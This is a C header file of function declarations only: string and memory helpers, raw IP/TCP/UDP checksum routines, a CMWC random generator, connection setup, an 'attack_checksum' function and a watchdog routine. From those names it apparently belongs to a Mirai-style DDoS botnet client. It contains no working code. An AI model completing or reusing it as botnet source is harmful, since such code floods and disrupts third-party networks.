#pragma once

#include <arpa/inet.h>
#include <sys/select.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <netinet/ip.h>


int util_isdigit(char);
int util_isalpha(char);
int _strlen(char *);
int _strcmp(char *, char *);
void _memcpy(void *, void *, int);
void _memset(void *, char, int);
char *_strcpy(char *, char *);
char *_strcat(char *, char *);
char *_strstr(char *, char *);
int _startswith(char *, char *);
char *_strdup(char *);
unsigned short in_cksum(unsigned short *, int);
void setup_connection(int *fd, struct sockaddr_in);
void set_signals(void);
void close_fds(void);
int check_connection(int);
void clear_and_set_fd(int, fd_set *);
void connection_failed(int, struct sockaddr_in);
uint32_t util_local_addr(void);
unsigned short attack_checksum(unsigned short *, int);
uint32_t rand_next(void);
uint16_t checksum_generic(uint16_t *, uint32_t);
uint16_t checksum_tcpudp(struct iphdr *, void *, uint16_t, int);
void remove_newline(char *);
uint32_t rand_cmwc(void);
int _read(int, char *, int);
unsigned short csum(unsigned short *, int);
void rand_init(void);
char *return_arch(void);
int _atoi(char *);
void ping_watchdog(void);
void *_memmove(void *, void *, size_t);
